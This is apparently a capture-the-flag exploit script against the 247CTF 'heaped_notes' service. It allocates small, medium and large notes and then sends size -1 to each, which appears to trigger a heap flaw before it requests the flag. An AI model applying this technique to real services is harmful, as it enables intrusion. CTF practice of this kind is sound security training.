#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./heaped_notes')
host = args.HOST or '135e6ec20c4087eb.247ctf.com'
port = int(args.PORT or 50208)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def cmd(choice):
	sla(b'Enter command:\n', str(choice).encode('utf-8'))

def small(size, data):
	cmd("small")
	sla(b"Enter the size of your small note:\n", str(size).encode('utf-8'))
	if size > 0:
		sla(b"Enter small note data:\n", data)

def medium(size, data):
	cmd("medium")
	sla(b"Enter the size of your medium note:\n", str(size).encode('utf-8'))
	if size > 0:
		sla(b"Enter medium note data:\n", data)

def large(size, data):
	cmd("large")
	sla(b"Enter the size of your large note:\n", str(size).encode('utf-8'))
	if size > 0:
		sla(b"Enter large note data:\n", data)

libc=SetupLibcELF()
io = start()

small(8, b"A")
small(-1, b"A")
medium(8, b"A")
medium(-1, b"A")
large(8, b"A")
large(-1, b"A")
cmd("flag")

io.interactive()
